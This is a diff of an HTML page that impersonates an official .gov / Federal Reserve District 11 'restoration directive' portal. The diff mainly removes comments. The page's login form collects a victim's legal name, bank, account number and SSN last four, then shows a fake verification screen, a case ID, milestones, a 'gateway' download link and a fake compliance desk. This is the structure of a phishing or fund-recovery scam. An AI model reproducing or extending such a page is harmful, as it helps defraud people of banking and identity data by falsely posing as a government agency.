@@ -15,7 +15,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ===== YOUR ORIGINAL LOGIN STYLES - PRESERVED ===== */
         .nav-header { background-color: #0f172a; color: white; border-bottom: 5px solid #b91c1c; }
         
         .status-badge-locked { background-color: #fee2e2; border: 1px solid #dc2626; color: #991b1b; }
@@ -64,17 +63,14 @@
             box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.1);
         }
 
-        /* ===== GOV BANNER STYLES ===== */
         .gov-banner { background: #f1f5f9; padding: 8px 10%; border-bottom: 1px solid #334155; font-size: 13px; }
         .banner-flex { display: flex; align-items: center; gap: 12px; max-width: 1200px; margin: 0 auto; cursor: pointer; }
         .flag-svg { height: 16px; width: auto; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
         .how-know { color: #002f6c; text-decoration: underline; font-weight: 600; margin-left: 4px; }
 
-        /* Dropdown Functionality */
         .gov-dropdown { display: none; background: #fff; border: 1px solid #e2e8f0; padding: 25px; margin-top: 10px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
         .gov-dropdown.active { display: block; }
 
-        /* ===== AUDIT LINE ANIMATION ===== */
         .audit-line { 
             opacity: 0; 
             transform: translateY(4px); 
@@ -90,7 +86,6 @@
             } 
         }
 
-        /* ===== DALLAS FED STYLES ===== */
         .agency-badge {
             background-color: #0a3143;
             color: #fcba19;
@@ -144,7 +139,6 @@
             font-size: 0.7rem;
         }
 
-        /* Milestone list styling */
         .milestone-item {
             display: flex;
             align-items: center;
@@ -182,7 +176,6 @@
             display: inline-block;
         }
 
-        /* ===== SECTION VISIBILITY ===== */
         #login-section, #loading-screen, #main-portal, #restoration-dashboard {
             display: none;
         }
@@ -191,7 +184,6 @@
 </head>
 <body class="min-h-screen flex flex-col justify-between">
 
-    <!-- ===== OFFICIAL .GOV BANNER WITH FLAG & DROPDOWN ===== -->
     <section class="gov-banner">
         <div class="banner-flex" onclick="toggleGov()">
             <svg class="flag-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1235 650">
@@ -221,7 +213,6 @@
         </div>
     </section>
 
-        <!-- ===== HEADER ===== -->
         <header class="nav-header px-4 py-6 md:px-8 no-print">
         <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
             <div class="flex items-center gap-4">
@@ -245,7 +236,6 @@
 
     <main class="flex-grow w-full max-w-7xl mx-auto p-4 md:p-8">
 
-        <!-- ===== YOUR ORIGINAL LOGIN SECTION - COMPLETE, NO PLACEHOLDERS ===== -->
         <section id="login-section" class="max-w-lg mx-auto mt-8 md:mt-16 bg-white border border-slate-300 shadow-xl rounded-sm overflow-hidden">
             <div class="bg-slate-50 p-4 border-b border-slate-200 flex justify-between items-center">
                 <h2 class="text-sm font-black text-slate-800 uppercase tracking-wide">Identity Verification</h2>
@@ -259,13 +249,11 @@
                     </p>
                 </div>
 
-                <!-- Beneficiary Name - EMPTY -->
                 <div>
                     <label class="login-label">Beneficiary Legal Name</label>
                     <input type="text" id="login-name" placeholder="ENTER FULL LEGAL NAME">
                 </div>
                 
-                <!-- Bank Dropdown - FULL ORIGINAL LIST, NO PRESELECTION -->
                 <div>
                     <label class="login-label">Receiving Depository Institution</label>
                     <select id="login-bank">
@@ -334,7 +322,6 @@
                     </select>
                 </div>
 
-                <!-- Account & SSN Last 4 - EMPTY -->
                 <div class="grid grid-cols-2 gap-4">
                     <div>
                         <label class="login-label">DDA Account No.</label>
@@ -346,7 +333,6 @@
                     </div>
                 </div>
 
-                <!-- Login Button -->
                 <button onclick="triggerLoading()" id="login-btn" class="btn-gov w-full text-white font-black py-4 mt-4 shadow-lg text-sm">
                     Secure Authentication
                 </button>
@@ -356,7 +342,6 @@
             </div>
         </section>
 
-        <!-- ===== LOADING SCREEN ===== -->
         <section id="loading-screen" class="max-w-xl mx-auto mt-16 text-center" style="display: none;">
             <div class="flex flex-col items-center mb-8">
                 <svg class="animate-spin h-16 w-16 text-blue-800 mb-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -371,16 +356,13 @@
             </div>
         </section>
 
-        <!-- ===== RESTORATION DASHBOARD - SHOWN AFTER LOGIN ===== -->
         <div id="main-portal" style="display: none;">
             
-            <!-- AGENCY BADGE & CASE ID -->
             <div class="flex flex-wrap justify-between items-center mb-6">
                 <span class="agency-badge">☷ FEDERAL RESERVE DISTRICT 11 — RESTORATION DIRECTIVE</span>
                 <span class="bg-gray-800 text-white px-4 py-2 rounded text-xs font-mono font-bold">TX-B10B-2026-MUK1139-AUDIT</span>
             </div>
 
-            <!-- COMPLETION MILESTONES SECTION -->
             <div class="bg-white p-6 border-2 border-green-600 shadow-lg mb-8 rounded">
                 <div class="flex items-center justify-between mb-4">
                     <h2 class="text-xl font-black text-green-900">Completion Milestones</h2>
@@ -427,7 +409,6 @@
                 </div>
             </div>
 
-            <!-- VERIFICATION CONFIRMATION - SIMPLIFIED -->
             <div class="bg-green-50 border-l-8 border-green-600 p-6 mb-8 rounded-r-lg">
                 <div class="flex items-start gap-4">
                     <div class="text-4xl text-green-700">✓</div>
@@ -443,7 +424,6 @@
                 </div>
             </div>
 
-            <!-- CASE SUMMARY - WILL BE POPULATED AFTER LOGIN -->
             <div class="bg-white p-6 border border-slate-300 shadow-sm mb-8 rounded">
                 <div class="grid md:grid-cols-4 gap-4">
                     <div>
@@ -475,7 +455,6 @@
                 </div>
             </div>
 
-            <!-- OFFICIAL DIRECTIVE & GATEWAY ACCESS — LINK TO FRC DOWNLOAD PAGE -->
             <div class="bg-white p-6 border-2 border-blue-900 shadow-lg mb-8 rounded">
                 <div class="flex flex-wrap items-center gap-6">
                     <div class="bg-blue-100 p-3 rounded-full">
@@ -494,7 +473,6 @@
                 </div>
             </div>
 
-            <!-- TECHNICAL SUPPORT -->
             <div class="bg-gray-100 p-5 border border-gray-400 rounded text-sm">
                 <h4 class="font-black text-gray-900 text-sm uppercase mb-3 flex items-center gap-2">
                     <span>📞</span> FEDERAL RESERVE NODE 11 — COMPLIANCE DESK
@@ -1916,4 +1894,4 @@
   })();
 </script>
 </body>
-</html>
+    </html>
